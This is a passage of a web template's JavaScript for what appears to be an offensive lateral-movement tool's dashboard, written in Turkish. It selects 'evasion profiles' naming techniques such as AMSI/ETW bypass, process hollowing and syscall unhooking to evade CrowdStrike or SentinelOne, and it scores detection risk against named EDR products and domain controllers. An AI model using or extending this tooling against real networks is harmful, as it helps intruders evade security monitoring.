        techniques: ['sRDI Loader', 'Thread Hijacking', 'Sleep Obfuscation', 'AMSI+ETW Bypass'],
        description: 'Orta seviye koruma - standart EDR atlatma'
    },
    paranoid: {
        name: 'Paranoid',
        icon: 'fa-user-secret',
        color: 'cyber-purple',
        risk: 20,
        techniques: ['Process Hollowing', 'Doppelgänging', 'Ghosting', 'Entropy Sleep', 'Full Memory Encryption', 'Syscall Unhooking'],
        description: 'Maksimum gizlilik - CrowdStrike/SentinelOne bypass'
    },
    aggressive: {
        name: 'Aggressive',
        icon: 'fa-fire',
        color: 'orange-500',
        risk: 55,
        techniques: ['Early Bird APC', 'Fast Exec', 'Minimal Sleep'],
        description: 'Hız odaklı - kısa süreli operasyonlar'
    }
};

let currentProfile = 'default';

function selectProfile(profileName) {
    const profile = EVASION_PROFILES[profileName];
    if (!profile) return;
    
    currentProfile = profileName;
    
    // Tüm kartların border'ını temizle
    document.querySelectorAll('.profile-card').forEach(card => {
        card.classList.remove('border-cyber-primary', 'border-cyber-secondary', 'border-cyber-danger', 'border-cyber-purple', 'border-orange-500');
        card.classList.add('border-transparent');
    });
    
    // Seçili kartın border'ını aktif et
    const selectedCard = document.querySelector(`[data-profile="${profileName}"]`);
    if (selectedCard) {
        selectedCard.classList.remove('border-transparent');
        selectedCard.classList.add(`border-${profile.color}`);
    }
    
    // Profil detaylarını göster
    const details = document.getElementById('profileDetails');
    details.classList.remove('hidden');
    
    document.getElementById('profileIcon').className = `fas ${profile.icon} text-${profile.color}`;
    document.getElementById('profileName').textContent = profile.name + ' Profile';
    document.getElementById('profileRiskBadge').className = `px-2 py-1 rounded text-xs bg-${profile.color}/20 text-${profile.color}`;
    document.getElementById('profileRiskBadge').textContent = `${profile.risk}% Risk`;
    
    // Teknikleri listele
    const techniquesDiv = document.getElementById('profileTechniques');
    techniquesDiv.innerHTML = profile.techniques.map(tech => `
        <div class="flex items-center gap-1 p-1 rounded bg-white/5">
            <i class="fas fa-check text-${profile.color} text-[10px]"></i>
            <span class="text-gray-300">${tech}</span>
        </div>
    `).join('');
    
    logActivity(`Profil seçildi: ${profile.name}`);
}

function applyProfileToSession() {
    const profile = EVASION_PROFILES[currentProfile];
    if (!profile) return;
    
    showNotification('Evasion Profili', `${profile.name} profili aktif ediliyor...`, 'info');
    logActivity(`${profile.name} profili aktif ediliyor...`);
    
    // API çağrısı
    fetch('/api/lateral/evasion/apply', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ profile: currentProfile })
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'ok') {
            updateActiveProfileDisplay(currentProfile);
            showNotification('Başarılı', `${profile.name} profili aktif edildi`, 'success');
            logActivity(`${profile.name} profili aktif - Risk: ${profile.risk}%`);
        } else {
            showNotification('Hata', data.error || 'Profil aktif edilemedi', 'error');
        }
    })
    .catch(err => {
        // API yoksa simüle et
        updateActiveProfileDisplay(currentProfile);
        showNotification('Başarılı', `${profile.name} profili aktif edildi (lokal)`, 'success');
        logActivity(`${profile.name} profili aktif - Risk: ${profile.risk}%`);
    });
}

function updateActiveProfileDisplay(profileName) {
    const profile = EVASION_PROFILES[profileName];
    if (!profile) return;
    
    const display = document.getElementById('activeProfileDisplay');
    display.innerHTML = `
        <div class="w-16 h-16 rounded-xl bg-${profile.color}/20 flex items-center justify-center mx-auto mb-2">
            <i class="fas ${profile.icon} text-${profile.color} text-2xl"></i>
        </div>
        <p class="text-white font-bold text-lg">${profile.name}</p>
        <p class="text-${profile.color} text-sm">%${profile.risk} Tespit Riski</p>
    `;
}

function calculateRisk() {
    const edr = document.getElementById('edrType').value;
    const env = document.getElementById('targetEnv').value;
    const profile = EVASION_PROFILES[currentProfile];
    
    // EDR zorluğu
    const edrDifficulty = {
        'none': 0,
        'windows_defender': 20,
        'sophos': 35,
        'kaspersky': 45,
        'carbon_black': 60,
        'sentinelone': 75,
        'crowdstrike': 85
    };
    
    // Ortam çarpanı
    const envMultiplier = {
        'workstation': 1.0,
        'server': 1.2,
        'dc': 1.5,
        'cloud': 1.1
    };
    
    const baseRisk = profile.risk;
    const edrBonus = edrDifficulty[edr] || 30;
    const envMult = envMultiplier[env] || 1.0;
    
    const finalRisk = Math.min(99, Math.round((baseRisk + edrBonus * 0.3) * envMult));
    
    let riskColor = 'cyber-primary';
    let riskLabel = 'DÜŞÜK';
    if (finalRisk > 70) { riskColor = 'cyber-danger'; riskLabel = 'YÜKSEK'; }
    else if (finalRisk > 40) { riskColor = 'cyber-warning'; riskLabel = 'ORTA'; }
    
    const resultDiv = document.getElementById('riskResult');
    resultDiv.classList.remove('hidden');
    resultDiv.innerHTML = `
        <div class="glass-light rounded-lg p-3 text-center">
            <p class="text-gray-400 text-xs mb-1">Tahmini Tespit Riski</p>
            <p class="text-${riskColor} text-2xl font-bold">%${finalRisk}</p>
            <p class="text-${riskColor} text-xs">${riskLabel} RİSK</p>
            <p class="text-gray-500 text-[10px] mt-2">${profile.name} + ${edr.replace('_', ' ').toUpperCase()}</p>
        </div>
    `;
    
    logActivity(`Risk analizi: ${finalRisk}% (${profile.name} + ${edr})`);
}

// Sayfa yüklendiğinde default profili seç
document.addEventListener('DOMContentLoaded', function() {
    selectProfile('default');
});
</script>
{% endblock %}
